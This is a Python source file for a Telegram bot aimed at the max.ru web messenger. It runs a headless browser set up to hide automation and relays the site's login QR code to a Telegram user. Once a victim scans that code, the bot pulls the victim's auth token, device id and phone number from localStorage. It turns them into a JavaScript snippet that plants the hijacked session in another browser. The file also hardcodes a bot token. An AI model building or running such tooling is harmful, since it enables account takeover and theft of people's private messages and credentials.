"""
Telegram бот для max.ru - ГОТОВАЯ ВЕРСИЯ ДЛЯ RENDER
"""

import logging
import asyncio
from io import BytesIO
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time
import json
import re
import traceback

# ==================== ТВОЙ НОВЫЙ ТОКЕН ====================
TOKEN = "8556187422:AAEibIikC64cpyXbJMeTljkibtkl7j0fJgs"
URL = "https://web.max.ru"
# ========================================================

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Глобальный драйвер
driver = None
user_sessions = {}

def create_driver():
    """Создает новый драйвер с подробным логированием"""
    logger.info("🔄 Начинаю создание драйвера...")
    
    options = Options()
    
    # Критические настройки для Render
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-extensions')
    options.add_argument('--window-size=1280x720')
    
    # Важные настройки для стабильности
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option('excludeSwitches', ['enable-automation'])
    options.add_experimental_option('useAutomationExtension', False)
    
    # User-Agent
    options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    
    # Оптимизация загрузки
    options.page_load_strategy = 'normal'
    
    # Добавляем дополнительные аргументы для стабильности
    options.add_argument('--disable-setuid-sandbox')
    options.add_argument('--disable-accelerated-2d-canvas')
    options.add_argument('--disable-accelerated-jpeg-decoding')
    
    try:
        logger.info("🔄 Устанавливаю ChromeDriver...")
        service = Service(ChromeDriverManager().install())
        
        logger.info("🔄 Запускаю Chrome браузер...")
        driver = webdriver.Chrome(service=service, options=options)
        
        # Проверяем, что драйвер работает
        driver.execute_script("return navigator.userAgent;")
        
        logger.info("✅ Драйвер успешно создан и работает")
        return driver
        
    except Exception as e:
        logger.error(f"❌ Ошибка создания драйвера: {e}")
        logger.error(traceback.format_exc())
        raise e

def extract_phone_number(auth_data):
    """Извлекает номер телефона из auth данных"""
    try:
        if isinstance(auth_data, str):
            data = json.loads(auth_data)
        else:
            data = auth_data
        
        phone = None
        
        # Проверяем разные поля
        if 'phone' in data:
            phone = data['phone']
        elif 'phoneNumber' in data:
            phone = data['phoneNumber']
        elif 'user' in data and isinstance(data['user'], dict):
            if 'phone' in data['user']:
                phone = data['user']['phone']
        elif 'viewerId' in data:
            phone = str(data['viewerId'])
        elif 'token' in data:
            token = data['token']
            phone_match = re.search(r'\d{10,11}', token)
            if phone_match:
                phone = phone_match.group()
        
        if phone:
            # Оставляем только цифры
            phone = re.sub(r'\D', '', str(phone))
            # Берем последние 10 цифр
            if len(phone) > 10:
                phone = phone[-10:]
            return phone
        
        return None
    except Exception as e:
        logger.error(f"Ошибка извлечения номера: {e}")
        return None

async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение QR-кода"""
    global driver
    user_id = str(update.effective_user.id)
    
    msg = await update.message.reply_text("⚡️ Запускаю процесс получения QR-кода...")
    
    try:
        # Закрываем старый драйвер если есть
        if driver:
            try:
                driver.quit()
                logger.info("Старый драйвер закрыт")
            except:
                pass
        
        # Создаем новый драйвер
        await msg.edit_text("🔄 Запускаю браузер...")
        driver = create_driver()
        
        # Загружаем страницу
        await msg.edit_text("📱 Загружаю страницу max.ru...")
        driver.get(URL)
        
        # Ждем загрузки
        await msg.edit_text("⏳ Ожидание загрузки страницы...")
        time.sleep(7)
        
        # Проверяем, что страница загрузилась
        page_title = driver.title
        logger.info(f"Заголовок страницы: {page_title}")
        
        # Делаем скриншот
        await msg.edit_text("📸 Делаю скриншот...")
        screenshot = driver.get_screenshot_as_png()
        
        # Проверяем размер скриншота
        logger.info(f"Размер скриншота: {len(screenshot)} байт")
        
        if len(screenshot) < 1000:
            logger.warning("Скриншот подозрительно маленький!")
        
        img_io = BytesIO(screenshot)
        img_io.name = "qr.png"
        
        await msg.delete()
        await update.message.reply_photo(
            photo=InputFile(img_io, filename="qr.png"),
            caption="✅ **QR-код готов!**\n\n👉 /file - после входа в аккаунт",
            parse_mode='Markdown'
        )
        
        user_sessions[user_id] = True
        logger.info(f"✅ QR отправлен пользователю {user_id}")
        
    except Exception as e:
        logger.error(f"❌ Ошибка в qr_command: {e}")
        logger.error(traceback.format_exc())
        await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")
        
        if driver:
            try:
                driver.quit()
            except:
                pass
            driver = None

async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла со скриптом"""
    global driver
    user_id = str(update.effective_user.id)
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сначала используй /qr")
        return
    
    if not driver:
        await update.message.reply_text("❌ Браузер не активен. Используй /qr")
        return
    
    msg = await update.message.reply_text("📁 Получаю данные из браузера...")
    
    try:
        # Проверяем, жив ли драйвер
        try:
            driver.current_url
        except:
            await msg.edit_text("❌ Браузер потерял соединение. Используй /qr заново")
            driver = None
            del user_sessions[user_id]
            return
        
        # Получаем данные из localStorage
        data = driver.execute_script("""
            return {
                deviceId: localStorage.getItem('__oneme_device_id'),
                auth: localStorage.getItem('__oneme_auth')
            };
        """)
        
        if data and data.get('deviceId') and data.get('auth'):
            # Парсим auth
            try:
                auth_data = json.loads(data['auth'])
            except:
                auth_data = {"token": data['auth'], "viewerId": "unknown"}
            
            # Извлекаем номер телефона
            phone_number = extract_phone_number(auth_data)
            
            # Форматируем JSON
            auth_str = json.dumps(auth_data, indent=2, ensure_ascii=False)
            
            # Создаем скрипт
            script = f"""sessionStorage.clear();
localStorage.clear();
localStorage.setItem('__oneme_device_id', '{data['deviceId']}');
localStorage.setItem('__oneme_auth', JSON.stringify({auth_str}));
window.location.reload();"""
            
            # Определяем имя файла
            if phone_number:
                filename = f"{phone_number}.txt"
                caption = f"✅ Файл для номера {phone_number}"
            else:
                filename = f"{data['deviceId'][:8]}.txt"
                caption = "✅ Файл готов"
            
            # Создаем файл
            file_bytes = BytesIO(script.encode('utf-8'))
            file_bytes.name = filename
            
            await msg.delete()
            await update.message.reply_document(
                document=InputFile(file_bytes, filename=filename),
                caption=caption
            )
            
            logger.info(f"✅ Файл {filename} отправлен пользователю {user_id}")
            
            # Закрываем браузер
            if driver:
                driver.quit()
                driver = None
            del user_sessions[user_id]
        else:
            await msg.edit_text(
                "❌ Вход не выполнен\n\n"
                "1️⃣ Отсканируй QR\n"
                "2️⃣ Войди на сайт\n"
                "3️⃣ Попробуй /file еще раз"
            )
            
    except Exception as e:
        logger.error(f"❌ Ошибка в file_command: {e}")
        logger.error(traceback.format_exc())
        await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    await update.message.reply_text(
        "👋 **Бот для max.ru**\n\n"
        "⚡️ **/qr** - получить QR-код\n"
        "📁 **/file** - получить файл после входа\n"
        "🔄 **/reset** - сбросить браузер\n\n"
        "✅ Бот работает на Render!",
        parse_mode='Markdown'
    )

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Сброс браузера"""
    global driver
    user_id = str(update.effective_user.id)
    
    if driver:
        try:
            driver.quit()
            logger.info("Драйвер закрыт по команде reset")
        except:
            pass
        driver = None
    
    if user_id in user_sessions:
        del user_sessions[user_id]
    
    await update.message.reply_text("✅ Браузер сброшен")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Проверка статуса бота"""
    status = "✅ Бот работает\n"
    status += f"📊 Драйвер: {'активен' if driver else 'не активен'}\n"
    status += f"👤 Активных сессий: {len(user_sessions)}"
    
    await update.message.reply_text(status)

def main():
    """Запуск бота"""
    print("="*60)
    print("🚀 ЗАПУСК БОТА MAX НА RENDER")
    print("="*60)
    print(f"📊 Токен: {TOKEN[:15]}...")
    print(f"🌐 Сайт: {URL}")
    print("="*60)
    
    # Создаем приложение
    app = Application.builder().token(TOKEN).build()
    
    # Добавляем обработчики команд
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("qr", qr_command))
    app.add_handler(CommandHandler("file", file_command))
    app.add_handler(CommandHandler("reset", reset_command))
    app.add_handler(CommandHandler("status", status_command))
    
    print("✅ Бот готов к работе!")
    print("📱 Команды: /qr /file /reset /status")
    print("="*60)
    
    # Запускаем бота
    app.run_polling()

if __name__ == "__main__":
    main()
